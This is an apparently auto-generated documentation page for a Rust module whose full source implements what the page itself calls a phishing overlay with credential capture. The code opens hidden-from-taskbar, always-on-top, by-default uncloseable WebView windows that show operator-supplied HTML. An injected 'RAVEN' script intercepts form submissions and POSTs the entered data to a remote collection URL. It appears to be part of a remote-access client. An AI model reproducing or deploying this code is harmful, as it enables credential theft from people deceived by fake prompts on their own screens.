# html_overlay

| Field | Value |
|-------|-------|
| **Source** | `src/client_rust/src/html_overlay.rs` |
| **Lines** | 267 |
| **Cards** | T023-client-capabilities |
| **Role** | WebView2-backed HTML phishing overlay with credential capture |

## Types

### struct `OverlayPayload` (line 12)

### struct `OverlayHandle` (line 42)

### enum `OverlayCmd` (line 48)

### struct `HtmlOverlayManager` (line 54)
Thread-safe registry of active HTML overlay windows.

## Public API

### `new` (line 62)
```rust
pub fn new() -> Self
```

### `show` (line 71)
```rust
pub fn show(&self, payload_json: &str)
```

### `hide` (line 90)
```rust
pub fn hide(&self, id: &str)
```

### `move_to` (line 103)
```rust
pub fn move_to(&self, id: &str, x: i32, y: i32, w: Option<u32>, h: Option<u32>)
```

### `close_all` (line 116)
```rust
pub fn close_all(&self)
```

## Internal Functions

- `default_x` (line 32)
- `default_y` (line 33)
- `default_width` (line 34)
- `default_height` (line 35)
- `default_true` (line 36)
- `close_id` (line 128)
- `spawn_window` (line 136)
- `build_full_html` (line 221)

## Key Dependencies

- `use serde::Deserialize;`
- `use tracing::{info, warn};`
- `use tao::dpi::{PhysicalPosition, PhysicalSize};`
- `use tao::event::{Event, WindowEvent};`
- `use tao::event_loop::{ControlFlow, EventLoopBuilder};`
- `use tao::platform::run_return::EventLoopExtRunReturn;`
- `use tao::platform::windows::{EventLoopBuilderExtWindows, WindowBuilderExtWindows};`
- `use tao::window::WindowBuilder;`
- `use wry::WebViewBuilder;`

## Full Source

```rust
// HTML Overlay — WebView2-backed floating window (Windows only).
// Mirrors the .NET HtmlOverlayManager/HtmlOverlayWindow pair.

use serde::Deserialize;
use std::collections::HashMap;
use std::sync::{Arc, Mutex};
use tracing::{info, warn};

// ── Payload ───────────────────────────────────────────────────────────────────

#[derive(Debug, Clone, Deserialize)]
pub struct OverlayPayload {
    pub id: String,
    pub html: String,
    #[serde(default)]
    pub css: String,
    pub submit_url: String,
    #[serde(default = "default_x")]
    pub x: i32,
    #[serde(default = "default_y")]
    pub y: i32,
    #[serde(default = "default_width")]
    pub width: u32,
    #[serde(default = "default_height")]
    pub height: u32,
    #[serde(default = "default_true")]
    pub always_on_top: bool,
    #[serde(default)]
    pub closeable: bool,
}

fn default_x() -> i32 { 400 }
fn default_y() -> i32 { 300 }
fn default_width() -> u32 { 420 }
fn default_height() -> u32 { 280 }
fn default_true() -> bool { true }

// ── Manager ───────────────────────────────────────────────────────────────────

/// Per-overlay control handle.
#[cfg(windows)]
struct OverlayHandle {
    proxy: tao::event_loop::EventLoopProxy<OverlayCmd>,
}

#[cfg(windows)]
#[derive(Debug)]
enum OverlayCmd {
    Close,
    Move { x: i32, y: i32, w: Option<u32>, h: Option<u32> },
}

/// Thread-safe registry of active HTML overlay windows.
pub struct HtmlOverlayManager {
    #[cfg(windows)]
    active: Arc<Mutex<HashMap<String, OverlayHandle>>>,
    #[cfg(not(windows))]
    _phantom: (),
}

impl HtmlOverlayManager {
    pub fn new() -> Self {
        HtmlOverlayManager {
            #[cfg(windows)]
            active: Arc::new(Mutex::new(HashMap::new())),
            #[cfg(not(windows))]
            _phantom: (),
        }
    }

    pub fn show(&self, payload_json: &str) {
        #[cfg(windows)]
        {
            let payload: OverlayPayload = match serde_json::from_str(payload_json) {
                Ok(p) => p,
                Err(e) => {
                    warn!("[HTML-OVERLAY] show: invalid JSON: {}", e);
                    return;
                }
            };
            self.close_id(&payload.id);
            self.spawn_window(payload);
        }
        #[cfg(not(windows))]
        {
            info!("[HTML-OVERLAY] show: not supported on this platform");
        }
    }

    pub fn hide(&self, id: &str) {
        #[cfg(windows)]
        {
            let map = self.active.lock().unwrap();
            if let Some(handle) = map.get(id) {
                let _ = handle.proxy.send_event(OverlayCmd::Close);
                info!("[HTML-OVERLAY] hide: sent Close to id={}", id);
            } else {
                info!("[HTML-OVERLAY] hide: id={} not found", id);
            }
        }
    }

    pub fn move_to(&self, id: &str, x: i32, y: i32, w: Option<u32>, h: Option<u32>) {
        #[cfg(windows)]
        {
            let map = self.active.lock().unwrap();
            if let Some(handle) = map.get(id) {
                let _ = handle.proxy.send_event(OverlayCmd::Move { x, y, w, h });
                info!("[HTML-OVERLAY] move: sent Move to id={} pos=({},{})", id, x, y);
            } else {
                info!("[HTML-OVERLAY] move: id={} not found", id);
            }
        }
    }

    pub fn close_all(&self) {
        #[cfg(windows)]
        {
            let map = self.active.lock().unwrap();
            for (id, handle) in map.iter() {
                let _ = handle.proxy.send_event(OverlayCmd::Close);
                info!("[HTML-OVERLAY] close_all: sent Close to id={}", id);
            }
        }
    }

    #[cfg(windows)]
    fn close_id(&self, id: &str) {
        let map = self.active.lock().unwrap();
        if let Some(handle) = map.get(id) {
            let _ = handle.proxy.send_event(OverlayCmd::Close);
        }
    }

    #[cfg(windows)]
    fn spawn_window(&self, payload: OverlayPayload) {
        use tao::dpi::{PhysicalPosition, PhysicalSize};
        use tao::event::{Event, WindowEvent};
        use tao::event_loop::{ControlFlow, EventLoopBuilder};
        use tao::platform::run_return::EventLoopExtRunReturn;
        use tao::platform::windows::{EventLoopBuilderExtWindows, WindowBuilderExtWindows};
        use tao::window::WindowBuilder;
        use wry::WebViewBuilder;

        let active = Arc::clone(&self.active);
        let id = payload.id.clone();

        std::thread::Builder::new()
            .name(format!("html_overlay_{}", &id[..id.len().min(8)]))
            .spawn(move || {
                let mut event_loop = EventLoopBuilder::<OverlayCmd>::with_user_event()
                    .with_any_thread(true)
                    .build();
                let proxy = event_loop.create_proxy();

                let window = match WindowBuilder::new()
                    .with_title("")
                    .with_position(PhysicalPosition::new(payload.x, payload.y))
                    .with_inner_size(PhysicalSize::new(payload.width, payload.height))
                    .with_always_on_top(payload.always_on_top)
                    .with_decorations(payload.closeable)
                    .with_skip_taskbar(true)
                    .build(&event_loop)
                {
                    Ok(w) => w,
                    Err(e) => {
                        warn!("[HTML-OVERLAY] window build failed id={}: {}", id, e);
                        return;
                    }
                };

                let full_html = build_full_html(&payload);
                // with_html returns WebViewBuilder (builder pattern, not Result);
                // build() is what returns Result<WebView>.
                let _webview = match WebViewBuilder::new(&window)
                    .with_html(&full_html)
                    .build()
                {
                    Ok(wv) => wv,
                    Err(e) => {
                        warn!("[HTML-OVERLAY] WebView build failed id={}: {}", id, e);
                        return;
                    }
                };

                {
                    let mut map = active.lock().unwrap();
                    map.insert(id.clone(), OverlayHandle { proxy });
                    info!("[HTML-OVERLAY] window ready id={}", id);
                }

                // run_return() exits cleanly without calling ExitProcess (unlike run()).
                event_loop.run_return(move |event, _, control_flow| {
                    *control_flow = ControlFlow::Wait;
                    let _ = &_webview; // keep webview alive alongside window
                    match event {
                        Event::UserEvent(OverlayCmd::Close) => {
                            active.lock().unwrap().remove(&id);
                            *control_flow = ControlFlow::Exit;
                        }
                        Event::UserEvent(OverlayCmd::Move { x, y, w, h }) => {
                            window.set_outer_position(PhysicalPosition::new(x, y));
                            if let (Some(nw), Some(nh)) = (w, h) {
                                let _ = window.set_inner_size(PhysicalSize::new(nw, nh));
                            }
                        }
                        Event::WindowEvent { event: WindowEvent::CloseRequested, .. } => {
                            active.lock().unwrap().remove(&id);
                            *control_flow = ControlFlow::Exit;
                        }
                        _ => {}
                    }
                });
            })
            .ok();
    }
}

// ── HTML builder ──────────────────────────────────────────────────────────────

fn build_full_html(p: &OverlayPayload) -> String {
    let submit_url_js = serde_json::to_string(&p.submit_url).unwrap_or_default();
    let overlay_id_js = serde_json::to_string(&p.id).unwrap_or_default();

    let runtime = format!(
        r#"<script>
(function(){{
  var _submitUrl = {submit_url_js};
  var _overlayId = {overlay_id_js};
  window.RAVEN = {{
    overlayId: _overlayId,
    submit: async function(action, data) {{
      try {{
        await fetch(_submitUrl, {{
          method: 'POST',
          headers: {{'content-type': 'application/json'}},
          body: JSON.stringify({{overlay_id: _overlayId, action: action, data: data}})
        }});
      }} catch(e) {{ console.warn('[RAVEN] submit error', e); }}
    }}
  }};
  document.addEventListener('DOMContentLoaded', function() {{
    document.querySelectorAll('form[data-action]').forEach(function(f) {{
      f.addEventListener('submit', async function(e) {{
        e.preventDefault();
        var action = f.dataset.action;
        var data = Object.fromEntries(new FormData(f));
        await window.RAVEN.submit(action, data);
        var r = document.getElementById('result') || document.querySelector('[data-result]');
        if (r) r.innerHTML = '<p style="color:#6ee7b7;margin:8px 0">Sent ✓</p>';
      }});
    }});
  }});
}})();
</script>
<style>{css}</style>"#,
        submit_url_js = submit_url_js,
        overlay_id_js = overlay_id_js,
        css = p.css,
    );

    format!(
        r#"<!DOCTYPE html><html><head><meta charset="utf-8">{runtime}</head><body>{html}</body></html>"#,
        runtime = runtime,
        html = p.html,
    )
}

```